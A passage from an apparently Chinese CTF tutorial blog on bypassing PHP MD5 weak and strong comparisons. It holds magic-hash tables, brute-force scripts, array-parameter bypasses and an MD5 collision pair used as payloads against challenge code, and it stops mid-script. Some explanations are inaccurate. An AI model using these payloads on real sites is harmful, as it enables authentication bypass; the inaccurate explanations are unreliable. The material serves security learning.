+<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>在CTF中可以说是经常碰到md5加密了，一般都是进行<code>强比较</code>抑或是<code>弱比较</code>，考法非常多，但是万变不离其中。只要我们掌握了原理，一切问题便迎刃而解了。<br><a name="NGMi1"></a></p>
+<span id="more"></span>
+
+<h2 id="简单了解MD5："><a href="#简单了解MD5：" class="headerlink" title="简单了解MD5："></a>简单了解MD5：</h2><ul>
+<li>md5是一种加密算法，并且<code>不能防止碰撞破解</code>。</li>
+<li>md5加密是不可逆的，这就意味着有<code>两串不同的字符串``加密出来的内容却是相同的</code></li>
+<li>加密过程简单，碰撞还原字符难</li>
+</ul>
+<p><a name="rvOcf"></a></p>
+<h2 id="PHP的弱比较："><a href="#PHP的弱比较：" class="headerlink" title="PHP的弱比较："></a>PHP的弱比较：</h2><p>先提两个例子：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">var_dump<span class="token punctuation">(</span><span class="token string">"123a"</span><span class="token operator">==</span><span class="token number">123</span><span class="token punctuation">)</span>
+var_dump<span class="token punctuation">(</span><span class="token string">"123a"</span><span class="token operator">==</span><span class="token string">"123"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong><font color='#ff9900'>不看答案想一下结果会是什么</font></strong></p>
+<p>在没有认真总结前，完全不知道弱比较还要区分<code>与**字符串**类型比较</code>还是<code>与int类型比较</code><br>上述实例的结果是：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">True
+False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><a name="C4062"></a></p>
+<h3 id="字符串与int类型比较"><a href="#字符串与int类型比较" class="headerlink" title="字符串与int类型比较:"></a>字符串与int类型比较:</h3><p>PHP规定当进行<code>字符串与数字的弱比较时</code>，会<code>进行如下步骤</code>：<br>先看字符串开头是否为数字，如果为数字，则截止到连续数字的最后一个数字，即<code>&quot;123abc456&quot;</code>&#x3D;&gt;<code>123</code><br>如果开头不为数字，则判断为false，即0。因此<br><code>(&quot;aaa123&quot;==0)</code> &#x3D;&gt;<code>true</code><br><code>(&quot;123a&quot;==123)</code> &#x3D;&gt;<code>true</code><br><strong>思维导图：</strong><br><img src="/images/2/2-1.png" alt="1"><br><a name="ILEFW"></a></p>
+<h3 id="字符串与字符串比较："><a href="#字符串与字符串比较：" class="headerlink" title="字符串与字符串比较："></a>字符串与字符串比较：</h3><p>正如上面所言：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">var_dump<span class="token punctuation">(</span><span class="token string">"123a"</span><span class="token operator">==</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //False<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>因为这个是字符串之间进行比较，想要绕过这个弱比较只能用<code>0e</code>的方式。<br>在PHP中”0e”判断为科学计数法，<code>0e123就是0的10123次方</code><br>不难推出：<code>0e123456789==0e1</code> &#x2F;&#x2F; 因为0的任意次方都为0<br>不过有一个注意点：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"0e123456"</span><span class="token operator">==</span><span class="token string">"0e345"</span>  //True
+<span class="token string">"0e12adfc"</span><span class="token operator">==</span><span class="token string">"0e345"</span>  //False
+
+在0e后面不能含有字母！！！
+在0e后面不能含有字母！！！
+在0e后面不能含有字母！！<span class="token operator">!</span>
+否则判断为False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>#实例</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+if<span class="token punctuation">(</span><span class="token string">"0e23253"</span><span class="token operator">==</span><span class="token string">"0e2345"</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token builtin class-name">echo</span> <span class="token string">'yes'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>输出：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><a name="eQQch"></a></p>
+<h2 id="CTF的MD5弱比较"><a href="#CTF的MD5弱比较" class="headerlink" title="CTF的MD5弱比较"></a>CTF的MD5弱比较</h2><p>在CTF中，会遇到如下的MD5弱比较题目<br><a name="XWV4b"></a></p>
+<h3 id="1-md5-a-x3D-x3D-md5-b-amp-a-x3D-b"><a href="#1-md5-a-x3D-x3D-md5-b-amp-a-x3D-b" class="headerlink" title="1.md5($a)&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b"></a>1.md5($a)&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
+<span class="token variable">$md5_1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$md5_2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token variable">$md5_1</span> <span class="token operator">!=</span> <span class="token variable">$md5_2</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"try harder"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个时候就要利用<code>0e</code>的形式来解题，找到两个不同字符，md5加密后却都是0e324234的形式。如何寻找这样的字符串？<br>1.脚本寻找</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># -*- coding: utf-8 -*-</span>
+import multiprocessing
+import hashlib
+import random
+import <span class="token keyword type-declaration">string</span>
+import sys
+
+<span class="token constant">CHARS</span> <span class="token operator">=</span> <span class="token keyword type-declaration">string</span><span class="token operator">.</span>ascii_letters <span class="token operator">+</span> <span class="token keyword type-declaration">string</span><span class="token operator">.</span>digits
+
+
+def <span class="token function">cmp_md5</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> <span class="token constant">CHARS</span>
+    <span class="token keyword">while</span> not stop_event<span class="token operator">.</span><span class="token function">is_set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token class-name return-type">rnds</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span>random<span class="token operator">.</span><span class="token function">choice</span><span class="token punctuation">(</span><span class="token constant">CHARS</span><span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token constant">_</span> in <span class="token function">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        md5 <span class="token operator">=</span> hashlib<span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span>rnds<span class="token punctuation">)</span>
+        value <span class="token operator">=</span> md5<span class="token operator">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> value<span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>
+            <span class="token comment"># print rnds</span>
+            <span class="token comment"># stop_event.set()</span>
+
+            <span class="token comment"># 碰撞双md5</span>
+            md5 <span class="token operator">=</span> hashlib<span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> md5<span class="token operator">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>
+                <span class="token keyword">print</span> rnds <span class="token operator">+</span> <span class="token string double-quoted-string">"=>"</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string double-quoted-string">"=>"</span> <span class="token operator">+</span> md5<span class="token operator">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string double-quoted-string">"\n"</span>
+                stop_event<span class="token operator">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string single-quoted-string">'__main__'</span><span class="token punctuation">:</span>
+    substr <span class="token operator">=</span> sys<span class="token operator">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">strip</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    start_pos <span class="token operator">=</span> <span class="token keyword type-declaration">int</span><span class="token punctuation">(</span>sys<span class="token operator">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>sys<span class="token operator">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>
+    str_len <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span>
+    cpus <span class="token operator">=</span> multiprocessing<span class="token operator">.</span><span class="token function">cpu_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    stop_event <span class="token operator">=</span> multiprocessing<span class="token operator">.</span><span class="token function">Event</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    processes <span class="token operator">=</span> <span class="token punctuation">[</span>multiprocessing<span class="token operator">.</span><span class="token function">Process</span><span class="token punctuation">(</span>target<span class="token operator">=</span>cmp_md5<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span>
+                                                               stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                 <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span>cpus<span class="token punctuation">)</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> p in processes<span class="token punctuation">:</span>
+        p<span class="token operator">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> p in processes<span class="token punctuation">:</span>
+        p<span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用法：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">输入命令
+python md5.py <span class="token string">"0e"</span> <span class="token number">0</span>
+<span class="token string">"0e"</span> <span class="token operator">=</span><span class="token operator">></span>要跑的字符
+ <span class="token number">0</span>   <span class="token operator">=</span><span class="token operator">></span>要跑的字符的起始位置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/2/2-2.png"><br>脚本寻找要浪费大概十分钟左右的时间才能找出一个，可以用网上现成的，如果题目要求比较特殊的话，再利用自己的脚本跑<br>2.百度</p>
+<table>
+<thead>
+<tr>
+<th>MMHUWUV	    0e701732711630150438129209816536</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MAUXXQC   	0e478478466848439040434801845361</td>
+</tr>
+<tr>
+<td>IHKFRNS	    0e256160682445802696926137988570</td>
+</tr>
+<tr>
+<td>GZECLQZ	    0e537612333747236407713628225676</td>
+</tr>
+<tr>
+<td>GGHMVOE	    0e362766013028313274586933780773</td>
+</tr>
+<tr>
+<td>GEGHBXL	    0e248776895502908863709684713578</td>
+</tr>
+<tr>
+<td>EEIZDOI	    0e782601363539291779881938479162</td>
+</tr>
+<tr>
+<td>DYAXWCA	    0e424759758842488633464374063001</td>
+</tr>
+</tbody></table>
+<p><img src="/images/2/2-3.png"><br>这样子就出flag了<br><a name="ArvDI"></a></p>
+<h3 id="2-a-x3D-x3D-md5-a"><a href="#2-a-x3D-x3D-md5-a" class="headerlink" title="2.$a&#x3D;&#x3D;md5($a)"></a>2.$a&#x3D;&#x3D;md5($a)</h3><p>这一类题型要求满足$a是0e开头，且加密后也是0e开头<br>在网上收集了这些结果：</p>
+<table>
+<thead>
+<tr>
+<th>0e215962017	0e291242476940776845150308577824</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0e1284838308	   0e708279691820928818722257405159</td>
+</tr>
+<tr>
+<td>0e1137126905	   0e291659922323405260514745084877</td>
+</tr>
+<tr>
+<td>0e807097110	   0e318093639164485566453180786895</td>
+</tr>
+<tr>
+<td>0e730083352      0e870635875304277170259950255928</td>
+</tr>
+</tbody></table>
+<p>弱比较主要就是以上两种类型。<br><a name="UILG2"></a></p>
+<h2 id="CTF的MD5强比较"><a href="#CTF的MD5强比较" class="headerlink" title="CTF的MD5强比较"></a>CTF的MD5强比较</h2><p><a name="X5Dcp"></a></p>
+<h3 id="1-md5-a-x3D-x3D-x3D-md5-b-amp-a-x3D-b"><a href="#1-md5-a-x3D-x3D-x3D-md5-b-amp-a-x3D-b" class="headerlink" title="1.md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b"></a>1.md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b</h3><p><a name="Ajb8Q"></a></p>
+<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>数组绕过</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
+<span class="token variable">$md5_1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$md5_2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token variable">$md5_1</span> <span class="token operator">!=</span> <span class="token variable">$md5_2</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"try harder"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>md5_1[]=1&amp;md5_2[]=2</code><br>因为PHP对无法md5加密的东西不加密，结果为NULL，虽然会报错，但是null&#x3D;null，逻辑关系为True。所以可以输出flag<br><img src="/images/2/2-4.png"><br><a name="q6lP9"></a></p>
+<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>两串不一样的字符，加密结果却相同：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$a</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
+<span class="token variable">$b</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/2/2-5.png"><br>这个我的脚本就跑不出来了，是网上收集的。<br><a name="r2uDz"></a></p>
+<h2 id="题目实战："><a href="#题目实战：" class="headerlink" title="题目实战："></a>题目实战：</h2><p><a name="lz95C"></a></p>
+<h3 id="1-BJDCTF2020-Easy-MD5"><a href="#1-BJDCTF2020-Easy-MD5" class="headerlink" title="1.[BJDCTF2020]Easy MD5"></a>1.[BJDCTF2020]Easy MD5</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
+
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这题也是两个解法：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">法一：
+param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span>
+法二：
+<span class="token assign-left variable">param1</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<span class="token operator">&amp;</span><span class="token assign-left variable">param2</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a name="jh3Lk"></a></p>
+<h3 id="2-强网杯2020——Funhash"><a href="#2-强网杯2020——Funhash" class="headerlink" title="2.强网杯2020——Funhash"></a>2.强网杯2020——Funhash</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//level 1</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"hash1"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md4"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"hash1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'level 1 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">//level 2</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash2'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash3'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'level 2 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">//level 3</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM flag WHERE password = '"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"hash4"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a name="EMcpk"></a></p>
+<h4 id="levle-1"><a href="#levle-1" class="headerlink" title="levle 1"></a>levle 1</h4><p>很明显，这种是要md4加密，并且是”0e”+”数字” 加密后还是”0e”+”数字”的形式，上脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> multiprocessing
+<span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> string
+<span class="token keyword">import</span> sys
+
+CHARS <span class="token operator">=</span> string<span class="token punctuation">.</span>digits
+
+
+<span class="token keyword">def</span> <span class="token function">cmp_md4</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> CHARS
+    <span class="token keyword">while</span> <span class="token keyword">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        rnds <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>CHARS<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        rnds <span class="token operator">=</span> <span class="token string">"0e"</span><span class="token operator">+</span>rnds
+        md4 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'md4'</span><span class="token punctuation">,</span> rnds<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        value <span class="token operator">=</span> md4<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> value<span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>rnds<span class="token punctuation">)</span>
+                stop_event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    substr <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    start_pos <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>
+    str_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span>
+    cpus <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    stop_event <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    processes <span class="token operator">=</span> <span class="token punctuation">[</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>cmp_md4<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span>
+                                                               stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span><span class="token punctuation">)</span>
